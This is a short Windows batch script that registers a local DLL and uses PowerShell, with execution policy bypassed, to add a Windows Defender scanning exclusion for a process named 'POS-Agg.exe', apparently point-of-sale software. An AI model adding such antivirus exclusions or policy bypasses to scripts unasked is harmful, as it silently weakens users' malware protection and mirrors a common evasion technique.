@echo off

RegSvr32 "%~dp0%dlls/Wtdedit.dll"
PowerShell -NoProfile -ExecutionPolicy Bypass -Command "& Add-MpPreference -ExclusionProcess "POS-Agg.exe""
PowerShell exit
exit
